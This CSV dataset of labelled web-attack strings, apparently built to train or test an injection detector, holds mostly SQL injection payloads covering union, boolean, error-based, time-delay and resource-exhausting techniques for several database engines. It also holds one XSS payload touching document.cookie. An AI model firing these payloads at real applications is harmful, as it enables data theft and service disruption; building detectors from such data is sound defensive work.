payload,attack_type,label
1'+(select smze where 5616=5616;select (case when (7978=6009) then 7978 else 1/(select 0) end)--,sqli,1
"1)) as xebl where 3105=3105 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1
"1,(select (case when (4828=2600) then 1 else 1/(select 0) end))",sqli,1
"-2783' where 1494=1494 union all select 1494,1494,1494,1494,1494,1494--",sqli,1
1 rlike (select (case when (8314=5463) then 1 else 0x28 end)),sqli,1
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1
"1' in boolean mode) and make_set(8403=8403,8899)#",sqli,1
"1%'))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1
"1') as ohnu where 4097=4097 union all select null,null,null,null,null,null,null,null,null--",sqli,1
-2120') or 8734=8844#,sqli,1
"1 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)-- fzhj",sqli,1
"-5131'))) union all select 4854,4854,4854,4854,4854,4854,4854#",sqli,1
"1"" rlike sleep(5) and ""rylv"" like ""rylv",sqli,1
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",sqli,1
-8051) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (5637=5637,sqli,1
"1'||(select 'djoe' from dual where 8063=8063 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))||'",sqli,1
"1) where 2781=2781 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1')) as ypgz where 8704=8704;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1
"1"")) as cduw where 4495=4495;select pg_sleep(5)--",sqli,1
"-2549') as zfnf where 1993=1993 union all select 1993,1993,1993,1993,1993,1993--",sqli,1
"-1598))) union all select 9418,9418,9418,9418,9418,9418,9418#",sqli,1
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""ejmj"" like ""ejmj",sqli,1
"1' in boolean mode) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"-9596) where 3425=3425 union all select 3425,3425,3425,3425,3425,3425#",sqli,1
"1' in boolean mode);select * from generate_series(1431,1431,case when (1431=7822) then 1 else 0 end) limit 1--",sqli,1
1' in boolean mode);(select * from (select(sleep(5)))acdk)#,sqli,1
"1%""))) union all select null,null,null,null#",sqli,1
"1%"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""%""=""",sqli,1
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""bkoq""=""bkoq",sqli,1
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7182=7182",sqli,1
"-4825%') union all select 6804,6804,6804,6804,6804,6804,6804--",sqli,1
"1' in boolean mode);select benchmark(5000000,md5(0x714e4153))#",sqli,1
1) as vxsh where 4706=4706;if(6624=4232) select 6624 else drop function xyyt--,sqli,1
"-5998"") as gazd where 2814=2814 union all select 2814,2814,2814,2814,2814,2814,2814--",sqli,1
1 where 7464=7464 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,1
"1"") as ronb where 9368=9368;(select * from (select(sleep(5)))srmq)--",sqli,1
"1' union all select null,null,null--",sqli,1
"1""))) and make_set(6751=8128,8128) and (((""uhiy""=""uhiy",sqli,1
"1"") where 7471=7471 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",sqli,1
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (5468=5468",sqli,1
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1
"1')) as mdtm where 1393=1393 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1
"1%"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1
"1"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""mjkl""=""mjkl",sqli,1
"1) as udjn where 6871=6871 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
1;select sleep(5)-- waln,sqli,1
"-5702'))) union all select 7806,7806,7806,7806,7806--",sqli,1
"-4546') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1
1'||(select 'yyil' from dual where 3121=3121;if(2695=9045) select 2695 else drop function qmno--,sqli,1
"1 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
"1%"")) union all select null,null,null,null,null,null,null,null,null#",sqli,1
"1"" and (select * from (select(sleep(5)))fzno) and ""gddl"" like ""gddl",sqli,1
"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",sqli,1
1') where 5145=5145;if(2823=3532) select 2823 else drop function kmqw--,sqli,1
"1%"")));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
1'||(select 'hkvl' from dual where 8882=8882;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1
"-9389' where 5713=5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",sqli,1
"-9098'||(select 'xodn' from dual where 8202=8202 union all select 8202,8202,8202,8202,8202,8202,8202--",sqli,1
"1%"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",sqli,1
"1""))) and 7533=7533 and (((""xopd""=""xopd",sqli,1
1 where 9774=9774;begin dbms_lock.sleep(5); end--,sqli,1
"1"";begin dbms_lock.sleep(5); end and ""xlvn""=""xlvn",sqli,1
"-3637"" or (8459=8459)*4906",sqli,1
"1)) as rsnb where 3168=3168 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
-3166'||(select 'mtan' from dual where 9420=9420 union all select 9420#,sqli,1
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('dssx' like 'dssx",sqli,1
"1 where 7802=7802;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1
1')) rlike (select (case when (6205=1384) then 1 else 0x28 end)) and (('ahjf'='ahjf,sqli,1
1 where 5443=5443;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1
"1)) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"-6656"") union all select 3931#",sqli,1
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('fdoc' like 'fdoc",sqli,1
1'+(select twyt where 3376=3376 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',sqli,1
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""eslj"" like ""eslj",sqli,1
"1"") as rqpp where 9383=9383 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1
"1' and elt(4249=4249,7259) and 'nsbj' like 'nsbj",sqli,1
1' where 8945=8945 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rspz'='rspz",sqli,1
-7369 or 9323=9323#,sqli,1
"1"") rlike (select * from (select(sleep(5)))vwyq)#",sqli,1
-1816%'))) union all select 2072--,sqli,1
"1%"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1%')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"-9947""))) union all select 8765,8765,8765,8765,8765#",sqli,1
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""seci""=""seci",sqli,1
"1"")) as uycc where 4364=4364 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1
"-9886%'))) union all select 5191,5191,5191,5191,5191,5191,5191--",sqli,1
"-8209) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1
"1"") where 6018=6018 and 7533=7533--",sqli,1
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""wjhj""=""wjhj",sqli,1
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('rkoe'='rkoe",sqli,1
"1"")) as qhnb where 8302=8302 and (3020=3020)*6703--",sqli,1
"1%"" union all select null,null#",sqli,1
1 and 6802=3592--,sqli,1
"1' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"-9180"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1
1) as azoo where 8933=8933 and (3020=3020)*6703--,sqli,1
"1"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""ponv""=""ponv",sqli,1
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""cgps"" like ""cgps",sqli,1
"-9659))) union all select 8665,8665,8665,8665,8665,8665,8665--",sqli,1
"1"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"";select sleep(5)",sqli,1
1 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# lexm,sqli,1
"1"")) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"-3756') union all select 1034,1034,1034--",sqli,1
1) or sleep(5) and (2211=2211,sqli,1
1) where 5418=5418 union all select null--,sqli,1
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('xaoi'='xaoi",sqli,1
"1%"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
-7054) as gzvf where 9146=9146 or 3038=3038,sqli,1
1'||(select 'oxdh' where 6967=6967 and sleep(5)#,sqli,1
"1"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""wvkp"" like ""wvkp",sqli,1
-7111' or (8459=8459)*4906,sqli,1
1%')));select (case when (9746=8055) then 9746 else 1/(select 0) end)--,sqli,1
1') and (1471=7892)*7892 and ('kkok' like 'kkok,sqli,1
"1'+(select 'zkuf' where 3591=3591 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1
"1%"" and 9198=9198--",sqli,1
"1"")) as rign where 1604=1604 and 3661=3054--",sqli,1
"-9740"")) as pxkx where 5305=5305 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""ffcf"" like ""ffcf",sqli,1
"-3116""))) union all select 4600,4600,4600,4600--",sqli,1
"-3501""))) or (6789=6990)*6990 and (((""jnnc"" like ""jnnc",sqli,1
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",sqli,1
">""<img src=&{document.cookie=true;};>",xss,1
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ""cbck"" like ""cbck",sqli,1
"-3037) where 9024=9024 union all select 9024,9024--",sqli,1
1') union all select null--,sqli,1
"1' and elt(1533=5695,5695) and 'ycgi'='ycgi",sqli,1
-7034'))) union all select 4023#,sqli,1
"1%"") union all select null,null,null#",sqli,1
1'||(select 'kuxp' where 7123=7123 and 1688=4200#,sqli,1
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('vfnl'='vfnl",sqli,1
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1
"1'+(select jqyo where 4426=4426 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",sqli,1
"1 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"";select sleep(5)#",sqli,1
"1) where 2473=2473 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1
"-6534%')) or make_set(4107=9457,9457) and (('%'='",sqli,1
"-9508) union all select 9950,9950,9950,9950,9950,9950,9950#",sqli,1
1')) and 3814=4272--,sqli,1
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))-- dkwz",sqli,1
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",sqli,1
1))) rlike sleep(5) and (((6790=6790,sqli,1
-4058) union all select 9184--,sqli,1
"-6848"")) or 4071=5312",sqli,1
"1%"") and (3020=3020)*6703 and (""%""=""",sqli,1
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('oxvd' like 'oxvd",sqli,1
"1"")) as xbhp where 7527=7527;select count(*) from generate_series(1,5000000)--",sqli,1
"-1763"") or elt(1032=1032,3623) and (""nqvv""=""nqvv",sqli,1
"1"") as awdg where 9512=9512;select (case when (7169=7785) then 1 else 7169*(select 7169 from master..sysdatabases) end)--",sqli,1
"1"" where 1132=1132 or 6793=(select 6793 from pg_sleep(5))--",sqli,1
"1"")) and elt(1210=1210,sleep(5)) and ((""afby""=""afby",sqli,1
"1"") where 8153=8153;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1
"-5073"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""kbab"" like ""kbab",sqli,1
"1"";(select * from (select(sleep(5)))acdk)#",sqli,1
"1,iif(6625=6625,1,1/0)",sqli,1
-2431') or 8571=8571--,sqli,1
"1""))) rlike (select (case when (6915=4531) then 1 else 0x28 end)) and (((""jzzu""=""jzzu",sqli,1
1' in boolean mode) and 7533=7533#,sqli,1
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,1
"1""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""agaz""=""agaz",sqli,1
"1"") where 8095=8095 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1
"1 and elt(2770=3669,3669)# sfls",sqli,1
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",sqli,1
1');begin dbms_lock.sleep(5); end and ('uxzv'='uxzv,sqli,1
"1%"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""%""=""",sqli,1
1 where 1015=1015;select pg_sleep(5)--,sqli,1
1');select sleep(5) and ('vwmx'='vwmx,sqli,1
"1') where 7640=7640 and make_set(8978=8594,8594)--",sqli,1
1') as rhvm where 1420=1420;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1
1%')));begin user_lock.sleep(5); end and ((('%'=',sqli,1
"1%""))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1
"1"")) as tjdz where 8656=8656 union all select null,null,null,null,null--",sqli,1
"-5518) as yvqm where 7360=7360 union all select 7360,7360#",sqli,1
-3752,sqli,1
"1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dfxd' like 'dfxd",sqli,1
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""ksrh""=""ksrh",sqli,1
"1 and elt(1210=1210,sleep(5))-- ommf",sqli,1
"1"" and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""tfok"" like ""tfok",sqli,1
"1"") as rdvm where 6360=6360 and sleep(5)--",sqli,1
